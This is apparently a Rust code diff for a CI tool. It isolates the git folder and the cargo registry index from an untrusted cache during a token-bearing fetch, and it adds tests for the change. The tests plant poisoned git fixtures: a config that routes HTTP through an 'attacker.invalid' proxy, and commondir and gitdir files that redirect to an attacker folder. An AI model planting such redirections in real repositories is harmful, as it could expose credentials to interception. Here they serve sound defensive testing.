@@ -9,7 +9,8 @@ use std::time::{SystemTime, UNIX_EPOCH};
 use crate::error::CiError;
 
 const GIT: &str = "git";
-const SHARED: [&str; 2] = ["registry", GIT];
+const REGISTRY: &str = "registry";
+const DOWNLOADS: [&str; 2] = ["cache", "src"];
 const ATTEMPTS: u32 = 16;
 
 pub(super) struct Scratch {
@@ -18,27 +19,40 @@ pub(super) struct Scratch {
 }
 
 impl Scratch {
-    pub(super) fn create(cache: &Path, temp: &Path, share_git: bool) -> Result<Self, CiError> {
+    pub(super) fn create(cache: &Path, temp: &Path, trusted_cache: bool) -> Result<Self, CiError> {
         let scratch = Self {
             path: fresh_directory(temp)?,
             cache: cache.to_path_buf(),
         };
-        for name in SHARED {
-            let target = cache.join(name);
-            let prepared = if name == GIT && !share_git {
-                std::fs::create_dir(scratch.path.join(name))
-            } else {
-                std::fs::create_dir_all(&target)
-                    .and_then(|()| symlink(&target, scratch.path.join(name)))
-            };
-            prepared.map_err(|e| {
-                CiError::new(format!(
-                    "cannot prepare {} for the fetch: {e}",
-                    target.display()
-                ))
-            })?;
-        }
+        scratch.prepare(trusted_cache).map_err(|e| {
+            CiError::new(format!(
+                "cannot prepare {} for the fetch: {e}",
+                cache.display()
+            ))
+        })?;
         Ok(scratch)
+    }
+
+    fn prepare(&self, trusted_cache: bool) -> std::io::Result<()> {
+        if trusted_cache {
+            self.share(REGISTRY)?;
+            return self.share(GIT);
+        }
+        let registry = self.path.join(REGISTRY);
+        std::fs::create_dir(&registry)?;
+        std::fs::create_dir(registry.join("index"))?;
+        for name in DOWNLOADS {
+            let target = self.cache.join(REGISTRY).join(name);
+            std::fs::create_dir_all(&target)?;
+            symlink(&target, registry.join(name))?;
+        }
+        std::fs::create_dir(self.path.join(GIT))
+    }
+
+    fn share(&self, name: &str) -> std::io::Result<()> {
+        let target = self.cache.join(name);
+        std::fs::create_dir_all(&target)?;
+        symlink(&target, self.path.join(name))
     }
 
     pub(super) fn path(&self) -> &Path {
@@ -202,6 +216,86 @@ mod tests {
         drop(scratch);
         assert!(!path.exists());
         assert!(root.join("home/.cargo/registry/kept").is_file());
+    }
+
+    fn files(directory: &Path) -> Vec<PathBuf> {
+        let mut found = Vec::new();
+        let mut pending = vec![directory.to_path_buf()];
+        while let Some(next) = pending.pop() {
+            let Ok(read) = fs::read_dir(&next) else {
+                continue;
+            };
+            for entry in read.filter_map(Result::ok) {
+                found.push(entry.path());
+                if entry.file_type().is_ok_and(|kind| kind.is_dir()) {
+                    pending.push(entry.path());
+                }
+            }
+        }
+        found
+    }
+
+    #[test]
+    fn the_token_fetch_never_sees_a_cached_registry_index_repository() {
+        let plain = "[core]\n\trepositoryformatversion = 0\n\tbare = false\n";
+        let planted = "[http]\n\tproxy = http://attacker.invalid:8080\n";
+        let layouts: [(&str, &str, &str); 3] = [
+            ("commondir", ".git/commondir", "../../attacker"),
+            ("nested-dir", ".git/.git/config", planted),
+            ("nested-gitdir", ".git/.git", "gitdir: ../../attacker\n"),
+        ];
+        for (label, path, text) in layouts {
+            let root = tree(&format!("index-{label}"));
+            let cache = root.join("home/.cargo");
+            let index = cache.join("registry/index/github.com-1ecc6299db9ec823");
+            for (file, body) in [
+                (index.join(".git/config"), plain),
+                (cache.join("attacker/config"), planted),
+                (index.join(path), text),
+            ] {
+                fs::create_dir_all(file.parent().unwrap_or_else(|| unreachable!()))
+                    .and_then(|()| fs::write(&file, body))
+                    .unwrap_or_else(|e| unreachable!("{label}: {e}"));
+            }
+            let scratch = Scratch::create(&cache, &root.join("tmp"), false)
+                .unwrap_or_else(|e| unreachable!("{e}"));
+            let fresh = scratch.path().join("registry/index");
+            let meta =
+                fs::symlink_metadata(&fresh).unwrap_or_else(|e| unreachable!("{label}: {e}"));
+            assert!(meta.is_dir() && !meta.file_type().is_symlink(), "{label}");
+            assert_eq!(files(&fresh), Vec::<PathBuf>::new(), "{label}");
+        }
+    }
+
+    #[test]
+    fn the_token_fetch_starts_with_an_empty_git_folder_whatever_the_cache_holds() {
+        let root = tree("git-db");
+        let cache = root.join("home/.cargo");
+        let database = cache.join("git/db/dep-1a2b3c");
+        fs::create_dir_all(&database).unwrap_or_else(|e| unreachable!("{e}"));
+        fs::write(database.join("commondir"), "../../../attacker")
+            .unwrap_or_else(|e| unreachable!("{e}"));
+        fs::write(database.join("HEAD"), "ref: refs/heads/main\n")
+            .unwrap_or_else(|e| unreachable!("{e}"));
+        let scratch = Scratch::create(&cache, &root.join("tmp"), false)
+            .unwrap_or_else(|e| unreachable!("{e}"));
+        let git = scratch.path().join("git");
+        let meta = fs::symlink_metadata(&git).unwrap_or_else(|e| unreachable!("{e}"));
+        assert!(meta.is_dir() && !meta.file_type().is_symlink());
+        assert_eq!(files(&git), Vec::<PathBuf>::new());
+    }
+
+    #[test]
+    fn the_token_fetch_still_shares_the_downloaded_crates_with_the_cache() {
+        let root = tree("crates");
+        let cache = root.join("home/.cargo");
+        let scratch = Scratch::create(&cache, &root.join("tmp"), false)
+            .unwrap_or_else(|e| unreachable!("{e}"));
+        for part in ["cache", "src"] {
+            fs::write(scratch.path().join("registry").join(part).join("serde"), "")
+                .unwrap_or_else(|e| unreachable!("{part}: {e}"));
+            assert!(cache.join("registry").join(part).join("serde").is_file());
+        }
     }
 
     #[test]
